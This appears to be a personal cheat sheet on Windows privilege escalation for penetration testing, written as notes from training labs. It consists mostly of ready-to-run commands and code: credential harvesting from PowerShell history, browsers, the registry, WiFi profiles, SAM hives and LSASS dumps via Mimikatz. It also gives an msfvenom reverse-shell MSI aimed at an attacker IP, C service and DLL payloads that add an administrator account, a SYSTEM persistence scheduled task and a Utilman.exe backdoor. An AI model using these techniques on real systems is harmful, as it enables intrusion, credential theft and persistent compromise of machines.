# WINDOWS PRIVILEGE ESCALATION


## Account Types

Find user and group info by entering `lusrmgr.msc` into run.

| Name | Description |
| ---- | ----------- |
| Administrators | Admin account |
| Standard Users | Standard users |
| SYSTEM / LocalSystem | System account; more privileges than even administators. Not a regular account type. |
| Local Service | Default account used to run Windows services with minimum privileges. Uses anonymous connections over a network Not a regular account type. |
| Network Service | Default account used to run Windows services with minimum privileges. It will use the computer credentials to authenticate through the network |
| Server Operators | Members can modify services, access SMB shares and backup files |
| Backup Operators | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. |
| Print Operators | Members can log on to DCs locally and "trick" Windows into loading a malicious driver. |
| Hyper-V Administrators | If there's any virtual DCs then we can consider any virtualisation admins, such as Hyper-V Admins as Domain Admins. |
| Account Operators | Members can modify non-protected accounts and groups in the domain. |
| Remote Desktop Users | Users can RDP. |
| Remote Management Users | Users can WinRM / PSRemote into machine. |
| Group Policy Creator Owners | Members can create new GPOs but would need further permissions to link the GPO to a container, such as a domain or OU. |
| Schema Admins | Can modify the AD schema structure to backdoor any to-be-created group or GPO by adding a compromised account to the default object ACL. |
| DNS Admins | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record. (https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/) |


## Windows Integrity Levels

| Level | User permissions |
| ----- | ---------------- |
| System | SYSTEM (kernel, ...) |
| High | Elevated users |
| Medium | Standard users |
| Low | Very restricted rights, often used in sandboxed processes or other minimal uses |
| Untrusterd | Negligible access rights |

- Lower integrity levels cannot write to higher integrity levels
- Can use "Process Explorer" program to explore integrity levels or `whoami /groups` for user or `icacls` for files


## Permissions

- Inherit (I) - inherit permissions from parent object rather than explicitly define
- Full Control (F) - read, write, change, delete files and subfolders
- Modify (M) - read, write, delete
- Read & Execute (RX)
- List Folder Contents 
- Read (R)
- Write (W)


## Enumeration

### User & System Information

- `whoami /all`
- `hostname`
- `net user`
- `net localgroup`
    - `net localgroup Administrators`
- `net accounts` - account policy info
- `query user`


### Operating System

- `systeminfo`
- `ver`
- `[environment]::OSVersion.Version` (PowerShell)

Some commands that are useful to load system information (may require GUI):
- `msconfig.exe` - bring up boot configuration information
- `taskmgr.exe` - self-explanatory
- `compmgmt.exe` - useful info about **system tools**, **storage** and **services and applications**
- `UserAccountControlSettings.exe` - self-explanatory
- `msinfo32.exe` - system information
- `resmon.exe` - resource monitor
- `cmd.exe` - self-explanatory
- `regedt32.exe` - registry editor

### Patching & Updates

- `systeminfo`, locate KB IDs under 'Hotfixes' in this command's output and search in Microsoft's patching database: https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix
    - We can get an idea of when this machine was last patched, maybe we can run a public CVE exploit against it?

- `wmic qfe [list brief]`
- `Get-HotFix | ft -AutoSize` (PowerShell)

### Environment Variables

- `set`
- `gci $env:* | sort name` (PowerShell)

- Check out the PATH variable --> Windows will check the current working directory first for DLLs before then checking PATH from left-to-write.
    - If there is a directory in the PATH that is left of `C:\Windows\System32` then we can likely inject DLLs.

### Running Processes

- `tasklist /svc`
- `Get-Process`
- `Get-CimInstance -ClassName Win32_Process | Select ProcessName, CommandLine, ExecutablePath`

- Standard processes which can largely be skipped include:
    - Session Manager Subsystem - smss.exe
    - Client Server Runtime Subsystem - csrss.exe
    - WinLogon - winlogon.exe
    - Local Security Authority Subsystem Service - LSASS
    - Service Host - svchost.exe

### Installed Programs

- `wmic product get name, version, vendor`
- `Get-WmiObject -Class Win32_Product | Select Name, Version`
- `Get-CimInstance -ClassName Win32_Product | Select *` - then filter on what you need

### Network Information

- `ipconfig /all`
- `arp -a`
- `route print`
- `netstat -ano`

### Named Pipes

- `pipelist.exe /accepteula` from SysinternalsSuite - list pipes
- `accesschk.exe /accepeula \\.\Pipe\lsass -v` from SysinternalsSuite - view DACL of given pipe (lsass in this example)
    - also try `accesschk.exe -accepteula -w \pipe\<NAME>`
- `gci \\.\pipe\` (PowerShell)

### AV & EDR Information

- `Get-AppLockerPolicy` cmdlet for Microsoft AppLocker
    - `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` - get policies
    - `Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` --> Testing the policy, might need to replace binary as appropriate to test
- `Get-MpComputerStatus` cmdlet for Windows Defender status

### Big List of Windows cmd.exe Commands

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands

### System Information

Some commands that are useful to load system information:
- `msconfig.exe` - bring up boot configuration information
- `taskmgr.exe` - self-explanatory
- `compmgmt.exe` - useful info about **system tools**, **storage** and **services and applications**
- `UserAccountControlSettings.exe` - self-explanatory
- `msinfo32.exe` - system information
- `resmon.exe` - resource monitor
- `cmd.exe` - self-explanatory
- `regedt32.exe` - registry editor


### Useful Commands

Some useful commands are:

| Command | Description | Shell |
| ------- | ----------- | ----- |
| `echo %USERNAME%` | | cmd.exe |
| `systeminfo` | System information | Both |
| `whoami`, `whoami /priv`, `whoami /groups` | | Both |
| `ver` | | Both |
| `$env:username` | | PowerShell |
| `Get-LocalUser` | | PowerShell |
| `Get-LocalGroup` | | PowerShell |
| `Get-LocalGroupMember <GROUPNAME>` | | PowerShell |

Can't really be arsed to list the rest so find them here https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration.

### PowerShell Commands

Logging mechanisms
- **PowerShell Transcription:** Preserves all text input / output from a PS session as-is. Also known as "over-the-shoulder-transcription".
- **PowerShell Script Block Logging:** Records command and blocks of script code as events while executing --> much broader logging. 

Get PowerShell history:
```
PS C:\> Get-History

// Clear-History cmdlet can clear the above, but fails to clear history from PSReadline module
PS C:\> $history = (Get-PSReadlineOption).HistorySavePath
PS C:\> type $history
```

and for all users we have access to, we can use this neat one-liner:

```
PS C:\> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

PowerShell environment variables:

```
gci env:* | sort-object name
```

### Networking

```
PS C:\> ipconfig /all

PS C:\> route print

/**
 * View active network connections: are there other users connected? Think LSASS
 * -a for all active TCP connections as well as TCP and UDP ports
 * -n to disable name resolution
 * -o for process ID for each connection
*/
PS C:\> netstat -ano
```

### Unattended Windows Installations

Refers to when admins use Windows Deployment Services to deploy a single Windows OS image to multiple systems and do not require user interaction on systems to be installed. Credentials may be located in the following unattended windows installation configuration file locations:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`


### Wmic

Find information about the system, hardware, software etc. E.g. to find installed software info do:

`wmic product get name,version,vendor`


### Processes

```
PS C:\> Get-CimInstance -ClassName Win32_Process | Select ProcessName, CommandLine, ExecutablePath
```

### Powershell History

So apparently Powershell command history is logged. Can be accessed (in the hopes of finding a command executed with an unobfuscated set of credentials) via:
- cmd.exe through `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- Powershell through `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

### Saved Windows Credentials

Windows lets you save credentials. Saved credentials can be listed via `cmdkey /list`.

Note: passwords are not listed in this command. 

BUT can use `runas` command to run as a user from saved credentials using `runas /savecred /user:<username> cmd.exe`. Sort of like the Unix `sudo`.

We can also try to RDP for lateral movement if we have GUI access.

### IIS Configuration

Scanning through IIS configuration files can leak sensitive data such as credentials or other useful info:
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

### Possible Files of Interest

```
PS C:\> Get-ChildItem -Path C:\PATH\TO\DIR\OF\INTEREST -Include *.txt,*.ini,*.conf,*.json,*.yml,*.xml -File -Recurse -ErrorAction SilentlyContinue
```

e.g.

```
PS C:\> Get-ChildItem -Path C:\Users\<USER>\Documents -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

CHECK $Recycle Bin too!!

To find plaintext passwords and creds, we can

```
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
- `/SIM` will **S**earch recursively in subdirectories for an **I**nsensitive match and will only output the file names rather the lines of text (`/M`)
    - Can omit `/M` to print the actual password line but will probably be verbose output if theres a lot of random files that just happen to use the string even if not exposing a plaintext password. 
- `/C:"<SEARCH_STRING>"` will treat the search as a single string. If the string was "pass word" it will search for literally "pass word" with the space instead of matching "pass" *or* "word".

or

```
C:\> findstr /spin "password" *.*
```
- `/S` search recursively
- `/P` skip files with non-printable characters (binary files)
- `/I` case insensitive
- `/N` display line number

or

```
C:\> where /R C:\ *.config
```

and for a PowerShell-only method:

```
PS C:\> Select-String -Path C:\PATH\TO\SOMEWHERE\*.txt -Pattern password
```

Here's a list of interesting files which *should* be covered by the above commands, but hey you never know...

```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

### Sticky Notes

StickyNotes stores data in a SQLite database. The file is stored at `C:\Users\<USER>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` which we can copy to our local machine and explore with a tool like "DB Browser for SQLite":

```
SELECT Text FROM Note;
```

alternatively we can do it on the host machine in PowerShell using a module like "PSSQLite" (https://github.com/RamblingCookieMonster/PSSQLite):

```
PS C:\> Import-Module .\PSSQLite.psd1
PS C:\> $db = 'C:\Users\<USER>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\> Invoke-SQLiteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

(`ft /wrap` = `FormatTable -Wrap` for neat + tidy output)

Finally, we can also copy the SQLite file and just use `strings` on attacker machine to try to locate a password, but might be hell to go through depending on how much data StickyNotes holds.

### PowerShell Credentials

PowerShell can leverage *DPAPI* to store credentials for use in scripts and automation tasks. *DPAPI* protects credentials from being decrypted unless it is by the same user and computer it was created on.

If we find such a script / task, we can try:

```
$encryptedPassword = Import-Clixml -Path 'C:\PATH\TO\SCRIPT\pass.xml' // assuming XML-formatted storage
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
```

and view `$decryptedPassword` in plaintext.

### Browsers

Check Chrome, Firefox, Edge/IE and other browser's custom user dictionaries - sometimes people save passwords in these.

```
PS C:\> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

**Note:** the above will match the string password but we should probably check the dictionary without `Select-String` because only dummies will use "password" in their password. But hey, worth a shot! There's a lot of sillies out there c:

We can also try to view saved logins. For example, with Chrome, we can use `SharpChrome` (https://github.com/GhostPack/SharpDPAPI) to retieve saved credentials and cookies:

```
.\SharpChrome.exe logins /unprotect
```

### Saved Session Credentials

**Windows AutoLogon**

Can enumerate the AutoLogon hive keys:

```
C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

- `AdminAutoLogon` key tells us if AutoLogon is enabled or disabled (`1` if enabled)
- `DefaultUserName` is the username it will autologon with
- `DefaultPassword` *can* hold a plaintext password hehe >:)

*Note:* it is better to use AutoLogon from SysinternalsSuite since it will encrypt the password as a LSA secret.

**Automation**

LaZagne or...

Can use the "SessionGopher" tool (https://github.com/Arvanaghi/SessionGopher) to search stuff like PuTTY, WinSCP, FileZilla, RDP and other services for saved session data including credentials:

```
PS C:\> Import-Module .\SessionGopher.ps1
PS C:\> Invoke-SessionGopher -Target <LOCAL_OR_REMOTE_TARGET_NAME>
```

### WiFi Passwords

We can try to pivot across networks by abusing WiFi access:

REQUIRES ADMIN ACCESS, but we can review the machine's wireless card for recent connections with 

```
C:\> netsh wlan show profile
```

then checkout the `Key Content` value to view a plaintext password AFTER running

```
C:\> netsh wlan show profile <NETWORK_NAME> key=clear
```

### Software Abuse

Examine software to identify ways to discover credentials. E.g. browsers, email clients, FTP clients, SSH clients, VNC software etc.

```
// 32-bit apps
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

//64-bit apps
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

and for running processes

```
PS C:\> Get-Process

PS C:\> Get-CimInstance -ClassName Win32_Process | select *
```

#### Case study: PuTTY

PuTTY is a client used for SSH connections. Sometimes, connection parameters and sessions are stored for later use. SSH passwords themselves are not stored directly, but proxy passwords are. E.g. this command will expose cleartext authN details:
- `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
    - `/f` to find a string
    - `/s` to seach recursively
    - SimonTatham is part of the directory path regardless of username you're trying to find

More specifically, we can use `reg query HKCU\Software\SimonTatham\PuTTY\Sessions` to find a list of PuTTY sessions, then for the session of interest we can `reg query HKCU\Software\SimonTatham\PuTTY\Sessions\<SESSION_NAME>` and review the keys for credentials.

Note that the access controls for this specific registry key are tied to the user account that configured and saved the session.

Therefore, in order to see it, we would need to be logged in as that user and search the HKEY_CURRENT_USER hive.

Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in HKEY_USERS.

### Windows Automation

- WinPEAS executable
- SharpUp: `.\SharpUp.exe audit`


## Kernel Exploits

Examples:

- CVE-2021-36934
    - *HiveNightmare* / *SeriousSam* is an exploit that allows you to read the SAM, SYSTEM and SECURITY files and output their contents to the pwd. PoC here: https://github.com/GossiTheDog/HiveNightmare
- CVE-2021-1675 and CVE-2021-34527
    - *PrintNightmare* is from a bug in 'RpcAddPrinterDriver' which lets you install printer drivers remotely and is intended to be accessed only by those with SeLoadDriverPrivilege. The bug does not check for this privilege and lets any authenticated user install the driver which can be leverages for RCE as SYSTEM.
    - Remote PoC (run from Kali) using impacket: https://github.com/cube0x0/CVE-2021-1675
    - Local PoC (run PowerShell script on target): https://github.com/calebstewart/CVE-2021-1675
    - May need to change payloads to send reverse shells rather than add a new user if needed
- CVE-2020-0668
    - Exploits arbitrary file move vulnerability, leveraging the behaviour of Windows Service Tracing (which is used in debugging and troubleshooting). The parameters are configurable in the Windows Registry.
    - If a custom `MaxFileSize` value specified is smaller than the size of the actual file, then a renaming move operation is triggered as NT AUTHORITY\SYSTEM. We can abuse this using mount points and symbollic links.
    - PoC available here: https://github.com/RedCursorSecurityConsulting/CVE-2020-0668 (needs to be built in Visual Studio).
        - Build soluition, should output the files: `CVE-2020-0668.exe`, `CVE-2020-0668.exe.config`, `CVE-2020-0668.pdb`, `NtApiDotNet.dll`, `NtApiDotNet.xml`
        - Generate a malicious binary like a reverse shell and transfer to target
        - We can now create a file in protected folders like `C:\Windows\System32` but cannot overwrite protected files. 2 ways to tackle this:
            1. Chain with another vulnerability, like using 'UsoDllLoader' or 'DiagHub' to load the DLL and escalate privileges; or
            2. Look for non-protected third-party software with binaries that run as SYSTEM, such as Mozilla's `maintenanceservice.exe`, which we should only have read access to.
        - Make a copy the malicious binary (the exploit will corrupt it the first time round)
        - `.\CVE-2020-0668.exe C:\PATH\TO\malicious1.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
        - `icacls` the target file and see we now have full permissions over the file, so now we can replace this corrupted malicious `maintenanceservice.exe` with our copy `malicious2.exe`
        - `net start MozillaMaintenance`


## UAC

If you are in a privileged group but your session token is of medium mandatory level (without these privileges) then we need to bypass UAC.

To check what level UAC is at, we can do

```
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

and compare against the MS documentation https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/settings-and-configuration

We can use this GitHub repo, UACME, to review which method we should use to bypass UAC as per our OS version https://github.com/hfiref0x/UACME (need to click on "Keys (click to expand/collapse)").


## Scheduled Tasks

Windows equivalent of cron jobs. List scheduled tasks in cmd using `schtasks` without any options:
- `schtasks /query /fo list /v | findstr TaskName` - view all tasks
- `schtasks /query /tn sometask /fo list /v` - view specific info about task with task name `sometask` (`/tn sometask`) in list form (`/fo list`) in _detail_ detail (`/v`).
- `Get-ScheduledTask | select *`
- `Get-ScheduledTask | Select-Object TaskName,URI,@{Name="User";Expression={$_.Principal.UserId}}` - find what users tasks run as

If a task script is overwritable by our current privileges, we can execute scripts as whoever the _Run As User_ property is. Privilege escalation :0! To check privileges, use `icacls C:\<vuln_schtasks_script_path>`.

We can create our own scheduled tasks for persistence as SYSTEM: `schtasks /create /sc minute /mo 1 /tn "SYSTEMSHELL" /tr "C:\path\to\shell.exe" /ru "SYSTEM" /f`


## AlwaysInstallElevated

Windows installer files (.msi) run with privilege level of user that starts it, **but can sometimes be configured to run with higher privilege from any user account**.

For this to be possible, two registry values are required:

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # check HKEY_CURRENT_USER
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # check HKEY_LOCAL_MACHINE
```

If true, write a malicious .msi script: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o evil.msi` and then execute.


## Windows Services

Misconfigured Windows services (like Windows version of daemons) can be exploited.

To enumerate servoces, can use GUI snap in `services.msc`, the `Get-Service` cmdlet or the `Get-CimInstance` cmdlet.

```
// Note, this command is denied to connections via netwroks logons but works with interactive logons like RDP

// Get all currently-running Windows services

PS C:\> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

OR

PS C:\> Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, StartName
```

Can use `icacls` on paths to identify vulnerable writable files. Example malicious file to replace with can be:

```
#include <stdlib.h>

int main()
{
    int i;
    i = system("net user <USERNAME> <PASSWORD> /add");
    i = system("net localgroup administrators <USERNAME> /add");

    return 0;
}
```

and then compile with `mingw-64` tool:

```
PS C:\> x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

and finally replace service executable with malicious executable (**note:** should save the original executable somewhere else to replace with later - don't wanna leave dodgy stuff lying around).

Restart the service and boom.

```
PS C:\> net stop <SERVICENAME>
PS C:\> net start <SERVICENAME>
```

*Note: sometimes our user can't net stop / start, so will need to enumerate how to relaunch service by* `Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like '<NAME>'}`

### Service Control Manager (SCM)

Services are managed by the Service Control Manager (SCM). Services are always run as a certain user specified by `SERVICE_START_NAME` when querying the configuration of the service.

**NOTE:** Sometimes SCM is not accessible on certain services like Evil-WinRM. Better to try with a reverse shell.

- Service configurations are stored in `HKEY\SYSTEM\CurrentControlSet\Services\`
- To query the SCM: `sc qc <service_name>` - means service control (`sc`) query configuration (`qc`) `<service_name>` - NEEDS TO BE DONE VIA COMMAND LINE NOT POWERSHELL
- To view permissions: `sc sdshow <service_name>` - requires administrator privileges :/
    - This guide helps to map the permission codes to meanings https://www.winhelponline.com/blog/view-edit-service-permissions-windows/
- `icacls` - lists permissions for the associated service script file
- `accesschk.exe -accepteula -quvcw <SERVICE_NAME>` - SysinternalsSuite tool to view permissions to edit the Service configuration itself, if possible we can maybe `sc config <SERVICE_NAME> binpath="cmd /c <COMMAND>"` or point to shell. **Don't forget to revert the service path after testing!**

### Unquoted Service Paths

Very rarely, the service script path might be incorrectly unquoted. If the script path is `C:\Stupidly Spaced Path\script.exe` then the service should be configured to `"C:\Stupidly Spaced Path\script.exe"`. If this is not the case, cmd.exe will attempt to execute in the following order and move down the list each time a file is not found until the valid binary is found:

1. `C:\Stupidly.exe Spaced Path\script.exe`
2. `C:\Stupidly Spaced.exe Path\script.exe`
3. `C:\Stupidly Spaced Path\script.exe`

If an attacker can modify any of the previous script paths before the final script, then you can hijack a service.

PowerUp.ps1 cmdlet: `Get-UnquotedService`


## DLL Hijacking

DLLs loaded by programs might be in writable directories. If executed under the context of a different user, we might be able to escalate privileges or do an admin action if executed under a high privilege user context (like creating our own new admin user).

DLLs are loaded from the below directories in the following order of prioritisation:
1. Directory from which application is loaded.
2. System directory.
3. 16-bit System directory.
4. Windows directory.
5. Current directory.
6. Directories listed in the PATH variable.

### Procmon.exe

We can see what DLLs are loaded by an application by using *Procmon.exe* which requires admin privileges but we can download the application to attacker machine and use Procmon in a windows VM.

Procmon is a GUI tool.

Once launched, add a filter such as "Process Name is <APPLICATION.EXE>", wipe the current data and launch the application to see what DLLs are loaded.

We can then filter to only look for `CreateFile` operations, which include creating or accessing existing files. Add the rules:
- "Path contains <VULNERABLE_DLL.dll>"
- "Operation is CreateFile"

Inspect where the DLL is loaded from. If we can overwrite or abuse the DLL loading prioritisation then we can place a malicious DLL there.

### Generating Malicious DLL

Can write a malicious DLL using Microsoft's C++ DLL template:

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DLLMain(
    HANDLE hModule, // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved // Reserved
)
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
        int i;
        i = system("net user <USERNAME> <PASSWORD> /add");
        i = system("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Then use `mingw64` to cross-compile:

```
link@kali:~$ x86_64-w64-mingw32-gcc malicious.cpp --shared -o <LEGIT_DLL_NAME.dll>
```

Replace or override legit DLL with this one for a new admin user.


## Windows Privileges

Exploiting Windows privilege misconfigurations. Helpful resource: https://github.com/gtworek/Priv2Admin. Run cmd with admin privileges to be able to carry out exploits such as below:

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1 to enable privileges that show up as disabled OR we can try in PowerShell with `Set-Se<PRIVILEGE_NAME>`.

### SeBackup and SeRestore
- Backup and Restore files/directories
- Allows you to read and write to any file and bypass DACL (Discretionary Access Control List) lists
- Example attack may be to backup `HKLM\SYSTEM` (contains system info) and `HKLM\SAM` (system access manager) registries to local area and send back to attacking machine using SMB or something, dump SAM user hashes and crack hash or exploit via Pass-the-Hash attack.
    
    ```
    C:\> mkdir C:\Temp
    C:\> reg save hklm\sam C:\Temp\sam.hive
    C:\> reg save hklm\system C:\Temp\system.hive
    ```

    transfer to attacker machine and then dump hashes:

    ```
    link@kali:~$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
    ```

We can also copy files using PowerShell:

```
PS C:\> Copy-FileSeBackupPrivilege '<FILE_ONE_PATH>' '<COPIED_FILE_PATH>'
```

We can also backup the entire system drive and then make file copies of key files to be readable by us. We can leverage `diskshadow.exe` (built-in MS package) to do this for e.g. NTDS.dit in the Domain Controller:

```
// This will make a shadow copy of C: and expose it as E:

PS C:\> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\> dir E:\
```

We can then copy the files of interest using the above methods OR use the command line tool `robocopy`:

```
C:\> robocopy /B <SOURCE_DIRECTORY> <DEST_DIRECTORY> <COPY_FILE_NAME>
```

### SeDebug

**Credential Extraction**

We can dump LSASS for credentials. We can get a .dmp file of this via either:

1. Manual dump (requires GUI) and transfer back to attacker machine
    - Task Manager > lsass.exe > Create Dump File
2. OR command line with `procdump.exe` by SysinternalsSuite
    ```
    C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```

Then with Mimikatz, either do it all with `privilege::debug` and `sekurlsa::logonpasswords` or if importing via file, use `sekurlsa::minidump <.dmp FILE>` then logonpasswords.

**RCE as SYSTEM**

We can achieve this by spawning a process (which will be the child process) and assigning it to a parent process which is owned by SYSTEM. The child process will then inherit the SYSTEM privileges.

Neat lil script to achieve this: https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1

Use `tasklist` or `Get-Process` to view processes and choose something that runs as SYSTEM, like LSASS.

Also check this one out https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC or just google SeDebug PoC

### SeTakeOwnership
- Fun one tbh
- Allows you to take ownership of a file
- Doing this alone won't let you overwrite, but you can change permissions to give your user full access to file and *then* you can overwrite.
- **Try this on any interesting looking files, like web-config, passwords, kdbx etc. that you cannot otherwise access.**

E.g. after launching cmd with admin privileges

```
whoami /priv
> SeTakeOwnership

takeown /f C:\Windows\System32\Utilman.exe
> done

icacls C:\Windows\System32\Utilman.exe /grant <my_user>:F
> done

copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
> done
```

### SeImpersonate

Check if print spooler is actually running: `Get-Service Spooler`

Now launching the ease of access menu in the login screen gives you cmd.exe with SYSTEM privileges!

`.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c <PAYLOAD>" -t *`
- `-l` means COM listening port

### PowerUp

Automated privesc utilities

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1


## Group Privileges

### Backup Operators

See SeBackupPrivilege section.

### Event Log Readers

Similar to Linux "adm" group - lets you read logs. How?

cmd.exe: `wevtutil`, we can run the following command on logs:
```
wevtutil qe <LOG> /rd:true /f:text /r:share01 /u:<USER> /p:<PASSWORD> | findstr <SEARCH-TERM>

// where `<SEARCH-TERM>` might be e.g. "/user" or "/pass"
```

PowerShell: `Get-WinEvent` - REQUIRES ADMIN ACCESS OR PERMISSIONS ADJUSTED ON REG KEY HKLM\System\CurrentControlSet\Services\EventLog\Security

```
Get-WinEvent -LogName <LOG> [-Credential <PSCRED>] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### DNS Admins

These guys have access to the DNS stuff on the network, like the DNS service which runs as NT AUTHORITY\SYSTEM and is typically found on Domain Controllers.

Custom plugins can be loaded to help with resolving name querties that are mot in the scope of any locally hosted DNS zones. 

There is this cool attack to gain SYSTEM privileges on a domain controller using this group. Ngl I ripped the below steps of HTB but here's a good post for clarity on the attack: https://adsecurity.org/?p=4064

1. DNS management is performed over RPC
2. ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
3. When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
4. When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
5. An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

How do we do this?
1. `msfvenom -p windows/x64/exec cmd='<COMMAND_PAYLOAD_HERE>' -f dll -o payload.dll` - generate malicious DLL
2. Download to target domain controller
3. `dnscmd.exe /config /serverlevelplugindll C:\PATH\TO\payload.dll` - Load DLL (as member of DNS Admins), note the path must be **full**

Unfortunately, the only remaining obstacle is to restart the DNS service. There's a fair chance that we are granted this permission since we're a DNS Admin, but it's not enabled by default. If not, then need to find another way of retsrating the service or waiting for a syadmin to do it.

Check privileges: `sc sdshow DNS`, compare against link in Windows Services section.

If allowed, then use `sc stop DNS` and `sc start DNS`

**This attack is very destructive!!** so we should obtain explicit consent for this attack *and* we need to clean up. We need to run the following with admin privileges:

1. `reg query [\\<IP_IF_REMOTE>\]HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters` - confirm the plugin DLL is added to registry key
2. `reg delete [\\<IP_IF_REMOTE>\]HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll` - delete the entry
3. Restart DNS service
4. `sc query dns` - confirm the restart was successful

Another attack that can be considered is using mimilib.dll to gain command execution by modifying the `kdns.c` file to execute as SYSTEM. This is described in this blog post and we can use the script below as a payload (ripped off HTB again):

```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

